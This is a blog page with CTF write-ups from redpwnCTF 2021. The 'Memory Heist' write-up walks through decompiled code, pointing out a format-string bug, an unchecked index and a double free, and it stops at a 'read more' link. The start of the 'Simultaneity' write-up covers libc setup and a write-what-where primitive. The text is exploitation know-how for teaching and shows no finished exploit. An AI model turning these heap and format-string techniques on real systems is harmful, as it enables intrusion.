1. Allocate
2. Delete
3. Print
&gt; 1
Enter the index for memory.
&gt; 0
Enter the size of memory.
&gt; 1337
Memory&gt; asdfasdfasdf
Saved.
1. Allocate
2. Delete
3. Print
&gt; 3
Re-visting memories comes at a cost.
Should you choose to accept to re-visit, half of your memories will be lost.
[Y/N]&gt; Y
Index&gt; 0
Contents:asdfasdfasdf1. Allocate
2. Delete
3. Print
&gt;
1. Allocate
2. Delete
3. Print
&gt; 2
Enter the index.
&gt; 0
Done.
  [--snipped--]
fish: “./memory-heist” terminated by signal SIGALRM (Timer expired)

</code></pre></div></div>

<p>So we have 3 options: “Allocate”, “Delete”, and “Print”. “Allocate” asks for an index, then a size, and then the contents. We can then “Print” the contents given an index. And finally we can “Delete” once done. Were also rudely interrupted by an <code class="language-plaintext highlighter-rouge">alarm()</code>, so were definitely not meant to do this manually, huh.</p>

<p>This looks like a pretty standard heap note challenge; we can allocate some space that we control at will, fill it with data which we also control, and then free/delete said allocation once done.</p>

<p>So lets take a look at our program in IDA/Ghidra to confirm or deny this hypothesis.</p>

<h1 id="reversing">Reversing</h1>
<h2 id="main">main()</h2>

<p>Since the binary is pretty small its feasible to walk through the binary one function at a time, so lets see what’s up:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">choice</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">welcome</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">choice</span> <span class="o">=</span> <span class="n">menu</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">print</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">allocate</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">delete</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Duh!"</span><span class="p">);</span>
  <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Okay, so first we call a function <code class="language-plaintext highlighter-rouge">welcome()</code>. This is pretty simple, just give us a welcome message, and setup a semi-random <code class="language-plaintext highlighter-rouge">alarm()</code> timer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">welcome</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">lol</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">lol</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
  <span class="n">alarm</span><span class="p">(</span><span class="n">lol</span> <span class="o">%</span> <span class="mi">1337</span> <span class="o">/</span> <span class="mi">20</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Welcome to Memory Heist.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So that’s why we get kicked out almost immediately. Next we enter a command loop from which we enter our choice:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
<span class="p">{</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="n">menu</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">print</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&gt;</span> <span class="mi">3</span> <span class="p">)</span>
    <span class="k">break</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">allocate</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">delete</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The first thing we do inside the loop is call <code class="language-plaintext highlighter-rouge">menu()</code> to display our options banner, then take said option, and return it:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__int64</span> <span class="nf">menu</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">choice</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="n">choice</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">choice</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"1. Allocate"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"2. Delete"</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"3. Print"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="n">choice</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">choice</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Back in the main command loop, we have branches for each corresponding option, and if we do not have any of these as our choice we leave the command loop and <code class="language-plaintext highlighter-rouge">exit()</code>.</p>

<p>Firstly, lets take a look at <code class="language-plaintext highlighter-rouge">allocate()</code>:</p>

<h2 id="allocate">allocate()</h2>

<p>We can already see some recognizable strings:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">allocate</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">idx_dup</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>

  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">nbytes</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">idx</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the index for memory."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the size of memory."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mh">0xB</span> <span class="o">||</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span><span class="p">)[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Duh!"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">idx_dup</span> <span class="o">=</span> <span class="n">idx</span><span class="p">;</span>
  <span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span><span class="p">)[</span><span class="n">idx_dup</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nbytes</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Memory&gt; "</span><span class="p">);</span>
  <span class="n">nbytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x4100</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">nbytes</span> <span class="o">+</span> <span class="mi">159</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">memcpy</span><span class="p">((</span><span class="o">&amp;</span><span class="n">chunks</span><span class="p">)[</span><span class="n">idx</span><span class="p">],</span> <span class="mh">0x4100</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>       <span class="c1">// smash &amp;chunks + idx?</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Saved."</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">canary</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So, looks like how we would expect; we enter <code class="language-plaintext highlighter-rouge">idx</code>, <code class="language-plaintext highlighter-rouge">nbytes</code> and then input contents, although the way contents is received is a little strange; first data is read from stdin into <code class="language-plaintext highlighter-rouge">.bss</code> rather than first <code class="language-plaintext highlighter-rouge">malloc()</code>ing a chunk of size <code class="language-plaintext highlighter-rouge">nbytes</code> and THEN reading data in from there. Doing it this way allows us to write as much data into <code class="language-plaintext highlighter-rouge">.bss</code> as we want, and although there’s nothing interesting you could do with this its still a little strange.</p>

<p>Anyway, if our <code class="language-plaintext highlighter-rouge">idx</code> doesn’t stray OOB, and the current slot is not occupied we are able to store our allocated memory there, our input is then read into + copied from <code class="language-plaintext highlighter-rouge">.bss</code> to our allocation after first being null terminated (I’m sort of sure that’s what <code class="language-plaintext highlighter-rouge">*(&amp;chunks + nbytes + 159) = 0;</code> is doing, anyway).</p>

<p>So summed up, <code class="language-plaintext highlighter-rouge">allocate()</code> does a couple things:</p>
<ul>
  <li>Take <code class="language-plaintext highlighter-rouge">idx</code>, <code class="language-plaintext highlighter-rouge">nbytes</code>, and chunk Contents.</li>
  <li>Verify our <code class="language-plaintext highlighter-rouge">idx</code> does not go OOB and that we aren’t replacing an allocation which is in use.</li>
  <li>If we abide by the rules above, copy our contents into our <code class="language-plaintext highlighter-rouge">allocation</code>.</li>
</ul>

<p>Lets move on to the next function, <code class="language-plaintext highlighter-rouge">print()</code>.</p>

<h2 id="print">print()</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">print</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">idx1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF</span>
  <span class="n">__int64</span> <span class="n">isPCT</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-20h]</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">chr</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-10h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">canary</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]</span>

  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">chr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Re-visting memories comes at a cost."</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Should you choose to accept to re-visit, half of your memories will be lost."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"[Y/N]&gt; "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">6uLL</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'N'</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'n'</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Thats alright."</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Index&gt; "</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx1</span><span class="p">);</span>               <span class="c1">// idx not checked here</span>
    <span class="n">chr</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">idx1</span><span class="p">);</span>                    <span class="c1">// uaf here</span>
    <span class="n">isPCT</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="n">chr</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">chr</span> <span class="o">==</span> <span class="sc">'%'</span> <span class="p">)</span>
        <span class="n">isPCT</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">isPCT</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">chr</span> <span class="o">==</span> <span class="sc">'n'</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Whoaa! Whatcha doin'?"</span><span class="p">);</span>
        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="o">++</span><span class="n">chr</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Contents:"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">idx1</span><span class="p">));</span>                  <span class="c1">// fmt string vuln</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">idx1</span> <span class="o">&amp;=</span> <span class="mi">1u</span><span class="p">;</span> <span class="n">idx1</span> <span class="o">&lt;=</span> <span class="mh">0xB</span><span class="p">;</span> <span class="n">idx1</span> <span class="o">+=</span> <span class="mi">2LL</span> <span class="p">)</span>
      <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">idx1</span><span class="p">)</span> <span class="o">=</span> <span class="err">'</span><span class="n">Timaohw</span><span class="err">'</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">canary</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We print the all too familiar prompt, then ask for a choice, <code class="language-plaintext highlighter-rouge">[Y/N]</code>. Choosing <code class="language-plaintext highlighter-rouge">N</code>/<code class="language-plaintext highlighter-rouge">n</code> simply returns us to the command loop, but any other char will take us forward.</p>

<p>We read an <code class="language-plaintext highlighter-rouge">idx</code>. Interestingly enough (though not relevant for our exploit) is that said <code class="language-plaintext highlighter-rouge">idx</code> is not checked for OOB. I’m not sure if this is a feature of the challenge for not, but this allows you to specify an arbitrary <code class="language-plaintext highlighter-rouge">idx</code> which will then be printed from.</p>

<p>Next we get the corresponding pointer for the given <code class="language-plaintext highlighter-rouge">idx</code> and iterate through the contents of our chunk, if we give <code class="language-plaintext highlighter-rouge">%n</code> as part of our buffer during <code class="language-plaintext highlighter-rouge">allocate()</code>, we will exit the program upon detecting that (format string incoming).</p>

<p>After this we pass our chunk contents directly into <code class="language-plaintext highlighter-rouge">printf</code>. Here is our format string bug, like the challenge description promised - but with the constraint that no <code class="language-plaintext highlighter-rouge">%n</code> is allowed, so no writing memory using this. Like promised at the start of the program, we will now lose half of our <code class="language-plaintext highlighter-rouge">memories</code>, in this case being our chunks. The string “whoamIT” will be written to half of our chunk slots, making them effectively useless.</p>

<p>Once placed here, these cannot be cleared, which means we cant use these slots for any more allocations, and we certainly cant free/delete them, as we will see soon.</p>

<p>Anyhow, we then check the canary and are returned to our command loop, but this time with serious <code class="language-plaintext highlighter-rouge">amnesia</code>… Haha geddit? Because memories?????? Okay I’ll stop.</p>

<h2 id="delete">delete()</h2>

<p>Finally we come to the crux of the issue, and arguably the most important function in our program. We come to the UAF:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="n">__int64</span> <span class="nf">delete</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter the index."</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%lu"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mh">0xB</span> <span class="o">||</span> <span class="o">!*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">||</span> <span class="o">*</span><span class="n">free_hook</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Duh!"</span><span class="p">);</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">chunks</span> <span class="o">+</span> <span class="n">v1</span><span class="p">));</span>                        <span class="c1">// free'd, but not cleared. ALSO not checked if freed previously</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Done."</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This function is pretty small, and all it does is validate, again that we don’t go OOB, then <code class="language-plaintext highlighter-rouge">free()</code>s a chunk in a given <code class="language-plaintext highlighter-rouge">idx</code> slot. It also checks if the <code class="language-plaintext highlighter-rouge">__free_hook</code> has been overwritten, and this is something we will need to bypass later.</p>

<p>You may notice a couple things, and if you have props to you, because I didn’t see this until very, very late in the CTF. We do not check the validity of any pointer we <code class="language-plaintext highlighter-rouge">free()</code>. This, combined with the fact that <code class="language-plaintext highlighter-rouge">free()</code>d chunks are never cleared could allow us to free a chunk twice. During the period between when it was last <code class="language-plaintext highlighter-rouge">free()</code>d we could have replaced crucial chunk metadata such as the size. This is what our exploit abuses.</p>

    <div class="more"><a href="/memory-heist-writeup/">read more</a></div>
  </article>

  <article>
    <header>
  <h1><a href="/Simultaneity-writeup/">Simultaneity Writeup</a></h1><time datetime="2021-07-27T00:00:00+01:00">July 27, 2021</time>
</header>

    <h1 id="intro">Intro</h1>
<p>This years redpwn started on the 9th of july, and ran through from 8PM BST till 8PM on the 12th. This was really fun, and I really praise the organisers for creating the superb
infrastructure and challenges that allowed me (and my <a href="https://ctftime.org/team/157675">team-mates</a> or <a href="https://ctftime.org/team/120331">here</a>) to toil away on these challenges. Cheers guys :).</p>

<p>This will be the first of (probably) a series of writeups for challenges in the pwn category of redpwnCTF 2021, disregarding the challenges I didn’t solve.</p>

<h2 id="description">Description</h2>

<p><img src="https://user-images.githubusercontent.com/73792438/125520811-639fe7e9-d1bd-4897-93f3-a7670b54f4f8.png" alt="image" /></p>

<p>This challenge specifically was extremely difficult (for me). The vulnerability as you will see is very obvious. However exploitation is another matter that 
requires knowledge of some heap internals, and alot of guesswork on my part. With that out of the way, lets begin.</p>

<p>(The solution script is at the bottom as well as in the github folder, I forgot that in my last writeup.)</p>

<h1 id="setup">Setup</h1>

<p>So whats up?</p>

<p>Well first things first, were provided with a libc and a linker. If we want to correctly emulate the challenge environment, we need to patch these into the program. You can
do that like so:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patchelf ./simultaneity <span class="nt">--set-interpreter</span> ./ld-linux-x86-64.so.2 <span class="nt">--replace-needed</span> libc.so.6 ./libc.so.6 <span class="nt">--output</span> simultaneity1
</code></pre></div></div>
<p>Now you should have <code class="language-plaintext highlighter-rouge">simultaneity1</code> which has the correct libc + linker. Something else to note is that the libc is stripped. There are quite a few ways to ‘unstrip’ a libc but 
I chose to download the debug symbols and simply use them with my gdb. To do this you can download the debug symbols that match the libc (you can get version info from a libc 
by running it), then extract them in the current
directory:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://ftp.de.debian.org/debian/pool/main/g/glibc/libc6-dbg_2.28-10_amd64.deb
<span class="nb">mkdir </span>dbg<span class="p">;</span> dpkg <span class="nt">-x</span> libc6-dbg_2.28-10_amd64.deb ./dbg/
</code></pre></div></div>
<p>Now whenever you want to use these symbols in gdb, simply type: <code class="language-plaintext highlighter-rouge">set debug-file-directory dbg/usr/lib/debug/</code> and you should (fingers crossed) have working symbols.
Now we should be all set to take a look at the binary.</p>

<h1 id="the-program">The program</h1>

<p>Its pretty simple:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125348293-f066ed00-e353-11eb-835e-65cd30359f54.PNG" alt="1" /></p>

<p>The program asks <code class="language-plaintext highlighter-rouge">how big?</code> and we can provide a size, it then spits out what looks like a <code class="language-plaintext highlighter-rouge">main_arena</code> heap address (from a heap that is aligned with the data segment). It then
asks <code class="language-plaintext highlighter-rouge">how far?</code> and <code class="language-plaintext highlighter-rouge">what?</code>. It seems that the program is straight up giving us a thinly veiled write-what-where primitive, nice.</p>

<p>If we look at the decompiled code for <code class="language-plaintext highlighter-rouge">main()</code> we can confirm this:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125348373-0aa0cb00-e354-11eb-89cc-5d2b3830c34f.png" alt="image" /></p>

<p>(ignore my mutterings at the bottom lol)
The program takes a <code class="language-plaintext highlighter-rouge">size</code> which is then passed to <code class="language-plaintext highlighter-rouge">malloc(size)</code> so we can control the size of an allocation. Then the program leaks the address of said allocation back to 
us. We can then specify another <code class="language-plaintext highlighter-rouge">size</code>/index that will then be multiplied by 8, then it will be added to the address of our allocation <code class="language-plaintext highlighter-rouge">(long)alloc + size * 8)</code>. We then use 
the result of this addition and write into it an <code class="language-plaintext highlighter-rouge">unsigned int</code>/<code class="language-plaintext highlighter-rouge">size_t</code>.</p>

<p>Another cool thing about this (other than being given an extremely powerful exploit primitive) is that because the <code class="language-plaintext highlighter-rouge">how far?</code> part of the program takes a regular integer 
via <code class="language-plaintext highlighter-rouge">__isoc99_scanf("%ld", &amp;size)</code> we can have a negative <code class="language-plaintext highlighter-rouge">size</code>/index. This, in turn means that we can not only write anywhere after our allocation, but also before.</p>

<h1 id="approaches">Approaches</h1>

<p>Now i’ll talk about the approach I tried initially. My first thought was, could we overwrite some interesting stuff on the heap? Maybe one of functions left something there?
However further inspection on the heap revealed that its just a barren wasteland.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555a000
Size: 0x251 &lt;------------------+
                               |
Allocated chunk | PREV_INUSE   +------------ Metadata :yawn:
Addr: 0x55555555a250
Size: 0x411 &lt;------------------ scanf()'s allocation to store our input in full
                              
Allocated chunk | PREV_INUSE   +------------ Our allocation
Addr: 0x55555555a660           |
Size: 0x21 &lt;-------------------+

Top chunk | PREV_INUSE
Addr: 0x55555555a680
Size: 0x20981

</code></pre></div></div>

<p>Nothing interesting here, and nothing that could be easily exploited; i thought perhaps through some manipulation of the <code class="language-plaintext highlighter-rouge">top</code> we could allocate a chunk, perhaps with <code class="language-plaintext highlighter-rouge">scanf</code> 
(yes, <code class="language-plaintext highlighter-rouge">scanf</code> does this) somewhere it isn’t meant to be? As it turns out, <code class="language-plaintext highlighter-rouge">scanf</code> will allocate the temporary buffer before it recieves our input+writes it, so sadly there is
no meddling we can do here, as no further allocations are made/free’d. Although under certain circumstances <code class="language-plaintext highlighter-rouge">scanf()</code> will <code class="language-plaintext highlighter-rouge">free()</code> the temporary buffer, so perhaps some 
opportunity exists there? I didn’t think about this too much, though.</p>

<p>I was quickly drawn to another idea. Whats in the <code class="language-plaintext highlighter-rouge">.bss</code> atm?</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125352528-4b4f1300-e359-11eb-9d8d-581a4a75cda4.png" alt="image" /></p>

<p>Not much, as you can see (and definitely nothing useful). My idea here was to overwrite some stuff and see what happened, did changing any of this stuff have any impact?
Sadly no. I was quite confident that modifying the <code class="language-plaintext highlighter-rouge">stdout@GLIBC</code> would have some effect, as the <code class="language-plaintext highlighter-rouge">FILE</code> struct is pretty complicated. But it was to no avail.</p>

<p>So we have a seemingly hopeless situation where we have very little, if any opportunity to overwrite anything; we have a (basically useless) <code class="language-plaintext highlighter-rouge">.text</code>/heap leak and no (reliable)
way to overwrite anything meaningful.</p>

<p>It was at this point where I became stuck for quite a while, and moved on to <code class="language-plaintext highlighter-rouge">image-identifier</code>. Only after finishing that and coming back did I realise what I had missed, on
the last day of the CTF.</p>

<h1 id="gaining-a-rather-strong-foothold">Gaining a (rather strong) foothold</h1>

<p><img src="https://user-images.githubusercontent.com/73792438/125354078-468b5e80-e35b-11eb-9eba-c21095da46e7.png" alt="image" /></p>

<p>I highlighted the important part. I neglected to fully consider the ability we have when controlling the size of an allocation. If we wanted, we could make <code class="language-plaintext highlighter-rouge">malloc()</code> fail and 
return a null pointer, but more importantly if an allocation is larger than the <code class="language-plaintext highlighter-rouge">top</code> chunk (aka, does not fit in the current heap) <code class="language-plaintext highlighter-rouge">malloc()</code> will use <code class="language-plaintext highlighter-rouge">mmap()</code> to allocate
some memory that fits the size of said allocation (if it can provide enough memory, that is).</p>

<p>If we, for example allocate a chunk that is 1 larger that <code class="language-plaintext highlighter-rouge">top</code> (0x209a1+1) then we should be able to force <code class="language-plaintext highlighter-rouge">malloc()</code> to make our heap elsewhere. And sure enough:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/125355878-6cb1fe00-e35d-11eb-8713-56e09c21ca91.png" alt="image" /></p>

